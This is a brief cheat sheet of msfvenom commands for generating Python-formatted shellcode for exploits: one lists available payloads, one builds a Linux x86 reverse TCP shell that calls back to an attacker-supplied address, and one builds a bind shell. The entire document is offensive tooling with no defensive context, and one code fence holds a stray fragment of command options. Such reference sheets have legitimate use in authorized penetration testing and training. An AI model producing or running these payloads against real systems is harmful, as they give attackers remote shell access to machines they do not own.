# Creating Payloads for Python Exploits

**List all payloads**
```
msfvenom -l payloads
```
**Linux x86 Reverse TCP Shell**
```
msfvenom -p linux/x86/shell/reverse_tcp LHOST=$ip LPORT=4444 -b "\x00" -f py
```

**Linux x86 Bind Shell**
```-b "\x00" -f py
msfvenom -p generic/shell_bind_tcp RHOST=$ip LPORT=4444 -b "\x00" -f py
```
